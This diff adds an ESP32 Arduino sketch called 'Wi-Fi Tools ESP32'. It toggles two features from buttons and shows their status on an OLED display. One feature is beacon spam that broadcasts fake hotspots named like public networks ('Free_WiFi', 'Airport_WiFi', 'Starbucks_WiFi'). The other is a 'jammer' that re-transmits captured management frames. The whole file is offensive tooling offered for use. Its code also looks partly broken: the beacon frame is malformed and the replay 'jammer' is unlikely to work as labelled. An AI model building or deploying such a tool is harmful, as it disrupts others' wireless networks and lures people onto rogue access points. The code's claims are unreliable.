@@ -1,0 +1,115 @@
+#include <Arduino.h>
+#include <WiFi.h>
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+#include "esp_wifi.h"
+
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
+
+#define BUTTON_JAMMER 4
+#define BUTTON_FAKE_WIFI 5
+
+bool jammerActive = false;
+bool fakeWifiActive = false;
+unsigned long lastBeaconTime = 0;
+const int beaconInterval = 100;
+
+const char* fakeSSIDs[20] = {
+    "Free_WiFi", "Hotel_WiFi", "Airport_WiFi", "Public_WiFi", "Starbucks_WiFi",
+    "Office_WiFi", "Metro_Free_WiFi", "Cafe_WiFi", "Library_WiFi", "Guest_WiFi",
+    "School_WiFi", "Gaming_Hotspot", "Secure_WiFi", "SuperNet", "Hackers_Network",
+    "FastNet", "Home_WiFi", "Fake_Spot", "Unlimited_WiFi", "CyberZone"
+};
+
+void sendBeacon(const char* ssid) {
+    uint8_t beaconPacket[128] = {
+        0x80, 0x00,
+        0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
+        0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
+        0x00, 0x00,
+        0x64, 0x00,
+        0x01, 0x04,
+        0x00
+    };
+
+    uint8_t ssidLen = strlen(ssid);
+    beaconPacket[37] = ssidLen;
+    memcpy(&beaconPacket[38], ssid, ssidLen);
+
+    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, 38 + ssidLen, true);
+}
+
+void handleFakeWiFi() {
+    if (fakeWifiActive && millis() - lastBeaconTime > beaconInterval) {
+        lastBeaconTime = millis();
+        static int ssidIndex = 0;
+        sendBeacon(fakeSSIDs[ssidIndex]);
+        ssidIndex = (ssidIndex + 1) % 20;
+    }
+}
+
+void startJammer() {
+    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT }; 
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
+        esp_wifi_80211_tx(WIFI_IF_AP, buf, ((wifi_promiscuous_pkt_t*)buf)->rx_ctrl.sig_len, true);
+    });
+}
+
+void stopJammer() {
+    esp_wifi_set_promiscuous(false);
+}
+
+void updateDisplay() {
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println("Wi-Fi Tools ESP32");
+    display.println("-----------------");
+    display.print("Jammer: ");
+    display.println(jammerActive ? "ACIK" : "KAPALI");
+    display.print("Fake Wi-Fi: ");
+    display.println(fakeWifiActive ? "ACIK" : "KAPALI");
+    display.display();
+}
+
+void setup() {
+    Serial.begin(115200);
+    pinMode(BUTTON_JAMMER, INPUT_PULLUP);
+    pinMode(BUTTON_FAKE_WIFI, INPUT_PULLUP);
+
+    WiFi.mode(WIFI_STA);
+    esp_wifi_set_promiscuous(true);
+
+    if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+        while (1);
+    }
+    display.clearDisplay();
+    display.setTextSize(1);
+    display.setTextColor(WHITE);
+    display.setCursor(0, 0);
+    display.println("Wi-Fi Tools ESP32");
+    display.display();
+    delay(2000);
+}
+
+void loop() {
+    if (digitalRead(BUTTON_FAKE_WIFI) == LOW) {
+        delay(200);
+        fakeWifiActive = !fakeWifiActive;
+        updateDisplay();
+    }
+    if (digitalRead(BUTTON_JAMMER) == LOW) {
+        delay(200);
+        jammerActive = !jammerActive;
+        if (jammerActive) startJammer(); else stopJammer();
+        updateDisplay();
+    }
+    handleFakeWiFi();
+}
+//bu kod geliştirme aşamsındadır stabil olmayan ve eksik olan kısımları olabilir açık kaynaklı ve geliştirmeye açıktır
